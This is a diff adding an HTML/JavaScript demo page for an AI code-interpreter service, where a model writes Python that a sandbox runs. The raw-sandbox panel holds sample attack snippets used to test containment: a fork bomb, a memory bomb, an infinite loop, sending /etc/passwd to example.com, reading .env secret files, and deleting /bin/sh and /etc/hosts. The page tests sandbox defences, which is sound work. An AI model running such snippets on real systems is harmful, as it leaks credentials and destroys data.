@@ -1,0 +1,173 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Code Interpreter</title>
+<style>
+  :root {
+    --bg: #0f1216; --panel: #161b22; --line: #2a313b; --text: #d7dde5; --dim: #8b949e;
+    --accent: #58a6ff; --ok: #3fb950; --bad: #f85149; --warn: #d29922; --mono: ui-monospace, SFMono-Regular, Menlo, monospace;
+  }
+  * { box-sizing: border-box; }
+  body { margin: 0; background: var(--bg); color: var(--text); font: 14px/1.5 system-ui, sans-serif; }
+  header { padding: 14px 20px; border-bottom: 1px solid var(--line); display: flex; align-items: baseline; gap: 14px; }
+  header h1 { margin: 0; font-size: 16px; font-weight: 600; }
+  header span { color: var(--dim); font-size: 13px; }
+  main { display: grid; grid-template-columns: 1fr 1fr; gap: 0; min-height: calc(100vh - 49px); }
+  @media (max-width: 900px) { main { grid-template-columns: 1fr; } }
+  section { padding: 18px 20px; border-right: 1px solid var(--line); }
+  section:last-child { border-right: 0; }
+  h2 { font-size: 13px; text-transform: uppercase; letter-spacing: .06em; color: var(--dim); margin: 0 0 12px; }
+  textarea, input[type=file] { width: 100%; background: var(--panel); color: var(--text); border: 1px solid var(--line); border-radius: 6px; padding: 10px; font: inherit; }
+  textarea.code { font-family: var(--mono); font-size: 13px; min-height: 150px; }
+  .row { display: flex; gap: 8px; align-items: center; margin: 10px 0; flex-wrap: wrap; }
+  button { background: var(--accent); color: #0b0f14; border: 0; border-radius: 6px; padding: 8px 14px; font: inherit; font-weight: 600; cursor: pointer; }
+  button.ghost { background: var(--panel); color: var(--text); border: 1px solid var(--line); font-weight: 500; }
+  button.danger { background: transparent; color: var(--bad); border: 1px solid var(--bad); font-weight: 500; }
+  button:disabled { opacity: .5; cursor: default; }
+  .log { margin-top: 14px; display: flex; flex-direction: column; gap: 10px; }
+  .step { background: var(--panel); border: 1px solid var(--line); border-radius: 8px; padding: 10px 12px; }
+  .step .t { color: var(--dim); font-size: 12px; margin-bottom: 6px; display: flex; gap: 10px; }
+  .step .t b { color: var(--text); }
+  pre { margin: 0; font-family: var(--mono); font-size: 12.5px; white-space: pre-wrap; word-break: break-word; }
+  pre.err { color: var(--bad); }
+  .tag { padding: 1px 7px; border-radius: 999px; font-size: 11px; font-weight: 600; }
+  .tag.ok { background: #16301d; color: var(--ok); } .tag.bad { background: #3a1416; color: var(--bad); } .tag.warn { background: #3a2a0f; color: var(--warn); }
+  .answer { border-color: var(--ok); }
+  .answer p { margin: 0; font-size: 15px; }
+  .usage { color: var(--dim); font-size: 12px; }
+  img.out { max-width: 100%; border-radius: 6px; margin-top: 8px; border: 1px solid var(--line); }
+  .file { color: var(--dim); font-size: 12px; margin-top: 8px; }
+</style>
+</head>
+<body>
+<header><h1>Code Interpreter</h1><span>an AI writes Python · a sandbox runs it · the kernel keeps it honest</span></header>
+<main>
+
+<section>
+  <h2>Ask the agent</h2>
+  <input type="file" id="file" accept=".csv,.txt,.json">
+  <div class="row">
+    <textarea id="q" rows="2" placeholder="Which month had the lowest revenue?"></textarea>
+  </div>
+  <div class="row">
+    <button id="ask">Ask</button>
+    <button class="ghost" onclick="preset('Which month had the lowest revenue, and how far below the average was it?')">lowest month</button>
+    <button class="ghost" onclick="preset('Plot revenue by month as a bar chart and save it as chart.png')">chart</button>
+    <button class="ghost" onclick="preset('Summarise this file in two sentences.')">summarise</button>
+  </div>
+  <div class="log" id="chatlog"></div>
+</section>
+
+<section>
+  <h2>Raw sandbox — POST /run</h2>
+  <textarea class="code" id="code" spellcheck="false">print("hello from the box")</textarea>
+  <div class="row">
+    <button id="run">Run</button>
+    <span class="usage">attacks:</span>
+    <button class="danger" onclick="attack('loop')">infinite loop</button>
+    <button class="danger" onclick="attack('mem')">memory bomb</button>
+    <button class="danger" onclick="attack('fork')">fork bomb</button>
+    <button class="danger" onclick="attack('net')">network</button>
+    <button class="danger" onclick="attack('secrets')">read secrets</button>
+    <button class="danger" onclick="attack('destroy')">destroy fs</button>
+  </div>
+  <div class="log" id="runlog"></div>
+</section>
+
+</main>
+<script>
+const $ = (s) => document.querySelector(s);
+const esc = (s) => s.replace(/[&<>]/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;" }[c]));
+
+const ATTACKS = {
+  loop: 'print("looping forever...", flush=True)\nwhile True:\n    pass',
+  mem: 'chunks = []\nwhile True:\n    chunks.append(bytearray(50 * 1024 * 1024))\n    print(f"allocated {len(chunks) * 50} MB", flush=True)',
+  fork: 'import os, time\nn = 0\nwhile True:\n    if os.fork() == 0:\n        time.sleep(60)\n    n += 1\n    print(f"forked {n}", flush=True)',
+  net: 'import urllib.request\nurllib.request.urlopen("https://example.com", data=open("/etc/passwd","rb").read(), timeout=5)\nprint("SENT - the sandbox is broken")',
+  secrets: 'import os\nfor p in ["/Users", "/root/.env", "/app/.env"]:\n    try:\n        print(p, "->", os.listdir(p) if os.path.isdir(p) else open(p).read()[:80])\n    except Exception as e:\n        print(p, "->", type(e).__name__)\nprint("/ ->", sorted(os.listdir("/")))',
+  destroy: 'import os\nfor t in ["/bin/sh", "/etc/hosts"]:\n    try:\n        os.remove(t); print("deleted", t, "<-- broken")\n    except Exception as e:\n        print(t, "->", type(e).__name__, e)\nopen("/tmp/ok.txt","w").write("x"); print("/tmp is writable (scratch)")',
+};
+function attack(k) { $("#code").value = ATTACKS[k]; $("#run").click(); }
+function preset(t) { $("#q").value = t; }
+
+function tagFor(r) {
+  if (r.timedOut) return '<span class="tag bad">TIMEOUT · SIGKILL 137</span>';
+  if (r.oomKilled) return '<span class="tag bad">OOM-KILLED · 137</span>';
+  return `<span class="tag ${r.exitCode === 0 ? "ok" : "warn"}">exit ${r.exitCode}</span>`;
+}
+function resultHtml(r) {
+  let h = "";
+  if (r.stdout.trim()) h += `<pre>${esc(r.stdout)}</pre>`;
+  if (r.stderr.trim()) h += `<pre class="err">${esc(r.stderr)}</pre>`;
+  for (const f of r.producedFiles ?? []) {
+    const url = `/jobs/${r.jobId}/${encodeURIComponent(f)}`;
+    h += /\.(png|jpg|svg)$/i.test(f)
+      ? `<img class="out" src="${url}" alt="${esc(f)}">`
+      : `<div class="file">wrote <a href="${url}" target="_blank">${esc(f)}</a></div>`;
+  }
+  return h;
+}
+function add(log, cls, inner) {
+  const d = document.createElement("div");
+  d.className = "step " + cls; d.innerHTML = inner; log.appendChild(d);
+  d.scrollIntoView({ block: "nearest" }); return d;
+}
+
+// ── raw sandbox ──────────────────────────────────────────────────────────────
+$("#run").onclick = async () => {
+  const code = $("#code").value; const log = $("#runlog"); $("#run").disabled = true;
+  const box = add(log, "", `<div class="t"><b>running…</b></div><pre>${esc(code)}</pre>`);
+  try {
+    const res = await fetch("/run", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ code }) });
+    const j = await res.json();
+    if (!j.ok) throw new Error(j.error);
+    const r = j.data;
+    box.innerHTML = `<div class="t">${tagFor(r)} <span>${r.durationMs} ms</span></div><pre>${esc(code)}</pre><hr style="border:0;border-top:1px solid var(--line);margin:8px 0">${resultHtml(r) || '<pre class="usage">(no output)</pre>'}`;
+  } catch (e) { box.innerHTML += `<pre class="err">${esc(String(e.message || e))}</pre>`; }
+  $("#run").disabled = false;
+};
+
+// ── agent ────────────────────────────────────────────────────────────────────
+$("#ask").onclick = async () => {
+  const question = $("#q").value.trim(); if (!question) return;
+  const log = $("#chatlog"); $("#ask").disabled = true;
+  const files = [];
+  const f = $("#file").files[0];
+  if (f) files.push({ name: f.name, content: await f.text() });
+  add(log, "", `<div class="t"><b>you</b>${f ? `<span>${esc(f.name)}</span>` : ""}</div><p style="margin:0">${esc(question)}</p>`);
+  const pending = {};
+  try {
+    const res = await fetch("/chat", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ question, files }) });
+    const reader = res.body.getReader(); const dec = new TextDecoder(); let buf = "";
+    for (;;) {
+      const { value, done } = await reader.read(); if (done) break;
+      buf += dec.decode(value, { stream: true });
+      let i; while ((i = buf.indexOf("\n\n")) >= 0) {
+        const frame = buf.slice(0, i); buf = buf.slice(i + 2);
+        if (frame.startsWith("data: ")) handle(JSON.parse(frame.slice(6)));
+      }
+    }
+  } catch (e) { add(log, "", `<pre class="err">${esc(String(e.message || e))}</pre>`); }
+  $("#ask").disabled = false;
+
+  function handle(e) {
+    switch (e.type) {
+      case "model_call": pending.thinking = add(log, "", `<div class="t"><b>step ${e.step}</b><span>asking the model…</span></div>`); break;
+      case "tool_call":
+        pending.thinking?.remove();
+        pending[e.step] = add(log, "", `<div class="t"><b>step ${e.step}</b><span>model wants to run:</span></div><pre>${esc(e.code)}</pre>`); break;
+      case "tool_result": {
+        const r = e.result; const d = pending[e.step] || add(log, "", "");
+        d.innerHTML += `<div class="t" style="margin-top:8px">${tagFor(r)} <span>sandbox · ${r.durationMs} ms</span></div>${resultHtml(r)}`; break;
+      }
+      case "answer": pending.thinking?.remove(); add(log, "answer", `<div class="t"><b>answer</b></div><p>${esc(e.text)}</p>`); break;
+      case "usage": { const u = e.usage; add(log, "", `<div class="usage">${u.modelCalls} model calls · ${u.steps} sandbox runs · ${u.inputTokens} in / ${u.outputTokens} out / ${u.thoughtTokens} thinking tokens</div>`); break; }
+      case "error": pending.thinking?.remove(); add(log, "", `<pre class="err">${esc(e.message)}</pre>`); break;
+    }
+  }
+};
+</script>
+</body>
+</html>
